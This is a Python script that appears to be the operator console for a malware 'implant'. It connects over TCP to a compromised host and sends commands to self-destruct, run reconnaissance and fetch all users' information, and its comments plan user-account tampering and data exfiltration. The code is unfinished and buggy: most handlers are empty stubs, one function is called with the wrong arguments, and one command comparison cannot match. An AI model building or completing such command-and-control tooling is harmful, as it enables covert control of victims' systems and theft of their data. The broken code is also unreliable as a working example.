#list commands for the implant 
#self destruct 
#fetch whole document 
#fetch new changes 
#add user/password mapping 
#delete user 
#get user 
#sleep 
#organize exfil of data 
import socket
import sys


def destruct(s: socket.socket, args: list):
    s.sendall(f"DESTRUCT")


def fetchAll(s: socket.socket):
    s.sendall("FETCHALL".encode())
    while True:
        data = s.recv(1024).decode()
        print(data)
        if data == "EOF":
            break


def fetchNew(s, args):
    pass


def addUser(s, args):
    pass


def removeUser(s, args):
    pass


def getUser(s, args):
    pass


def sleep(s, args):
    pass

def recon(s, command):
    s.sendall(" ".join(command).encode())
    data = s.recv(1024).decode()
    print(data)
    data = s.recv(1024).decode()
    print(data)

def printmenu():
    print("-------COMMAND OPTIONS------")
    print("FETCHALL: get all users and their information")  # TODO


if __name__ == "__main__":
    serverIP = sys.argv[1]
    serverPort = sys.argv[2]

    while True:
        command = input("what is your command").split()
        args = command[1:]
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((serverIP, int(serverPort)))
            if command[0] == "DESTRUCT":
                destruct(s)
            elif command[0] == "EXIT":
                s.close()
                exit()
            elif command[0] == "RECON":
                recon(s, command)
            elif command[0] == "FETCHALL":
                fetchAll(s)
            elif command == "FETCHNEW":
                fetchNew(s, args)
            elif command[0] == "ADDUSER":
                addUser(s, args)
            elif command[0] == "REMOVEUSER":
                removeUser(s, args)
            elif command[0] == "GETUSER":
                getUser(s, args)
            elif command[0] == "SLEEP":
                sleep(s, args)
            else:
                print(f"{command} is not a proper command")
